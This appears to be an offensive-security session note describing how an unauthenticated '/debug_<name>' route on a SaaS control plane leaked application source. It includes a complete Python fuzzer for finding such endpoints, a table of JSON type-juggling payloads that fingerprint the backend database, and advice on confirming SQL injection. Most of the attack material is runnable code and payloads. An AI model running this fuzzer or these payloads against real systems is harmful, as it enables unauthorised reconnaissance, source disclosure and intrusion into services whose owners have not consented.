# Source-disclosure endpoint fuzz + type-juggling oracle

Session detail for the `debug_<name>` pattern and the JSON type-juggling DB oracle.

## Case: `GET /debug_k11` -> full source of `/opt/<app>/k11_adapter.py`

Target: a multi-tenant SaaS control plane on `:8000` (FastAPI, OpenAPI exposed, 163 routes).
The admin SPA was gated (all `/admin/*` answered `401` until login), but `/debug_k11`
answered **200 with no auth at all**:

```json
{
  "file": "/opt/<app>/k11_adapter.py",
  "src": "def k11_get_weekly_bill(session, username, start=None, end=None):\n    _k11_get(session, '/api/vipReport/getYbPageInfo')\n    r = _k11_post(session, '/api/vipReport/getYb', json_body={'qs': '', 'qs2': '', 'date': '', 'date2': ''})\n ..."
}
```

Value extracted: the absolute install root (`/opt/<app>/`), the upstream platform endpoints the
app calls, the response fields it trusts (`qs`, `kjsj`, `zdJine`, `validJine`, `tyJine`, `zykJine`),
and the settlement maths. None of that was reachable through the gated API.

Only one `debug_<x>` route existed - the other ~40 words all 404'd. **Fuzz the adapter ids the UI
already told you about**; that is the high-yield seed.

## Runnable fuzzer

```python
#!/usr/bin/env python3
"""Fuzz /debug_<word> for source disclosure. Pure stdlib HTTP - no shell, no expansion."""
import http.client, json, re, sys

HOST, PORT = sys.argv[1], int(sys.argv[2])
AUTH = sys.argv[3] if len(sys.argv) > 3 else None      # optional "Bearer <tok>"

GENERIC = ("app main config settings auth control master worker node token secret env utils "
           "common db models schemas router api server wsgi asgi session crypto fernet jwt "
           "security backup restore deploy console adapter platform account bet queue "
           "monitor keepalive import export").split()

def get(path):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=6)
    h = {'Accept': 'application/json'}
    if AUTH:
        h['Authorization'] = AUTH
    try:
        conn.request('GET', path, headers=h)
        r = conn.getresponse()
        return r.status, r.read()
    except Exception:
        return 0, b''
    finally:
        conn.close()

seed_ids = []            # fill from the app: /adapter/platforms, /lottery/families, <select> opts
words = list(dict.fromkeys(seed_ids + GENERIC))
for w in words:
    for path in (f'/debug_{w}', f'/debug/{w}'):
        st, body = get(path)
        if st != 200 or not body[:1] == b'{':
            continue
        try:
            d = json.loads(body)
        except Exception:
            continue
        if d.get('file') or d.get('src'):                 # <- the tell
            print(f'HIT {path} file={d.get("file")} len={len(d.get("src") or "")}')
            open(f'debug_{w}.py', 'w').write(d.get('src') or '')
```

Run it through the skill's own discipline: **no shell**, payloads/URLs built in Python.

## Type-juggling oracle (same host, same session)

The batch endpoints took JSON. Feeding odd types mapped the backend and killed the SQLi
hypothesis in one pass:

| payload | response | reading |
|---|---|---|
| `{"ids": [[52207]]}` | `Error binding parameter 1 - probably unsupported type.` | sqlite3 wording -> **SQLite + parameterized** |
| `{"ids": 52207}` | `'int' object is not iterable` | handler iterates untrusted input unchecked |
| `{"ids": [None]}` / `[True]` / `[1.5]` | `count: 0, success: true` | coerced/ignored, no error |
| `{"ids": {"$gt": 0}}` | `count: 0, success: true` | NoSQL operator inert -> not Mongo |
| `{"ids": [9223372036854775807]}` | `count: 0` | no overflow error -> 64-bit int path |

`count: 0` with a bogus id is also the clean way to **prove the write handler is reachable**
without touching real rows.

## Companion discipline

- A keyword hit is not a hit: grepping the response for `CREATE` matched
  `document.createElement('tr')` in the page's own JS, and `sqlite_master` matched the reflected
  payload. Strip `<script>` blocks, and read the surrounding bytes before believing it.
- Boolean arms that render **byte-identical** pages mean parameterization or an unparsed parameter
  - not a blind SQLi you haven't found the trick for.
- Time-based arms need a same-session true/false/baseline trio with per-arm minimums; a target
  whose baseline jitters 0.4-3.8 s will manufacture false positives otherwise.
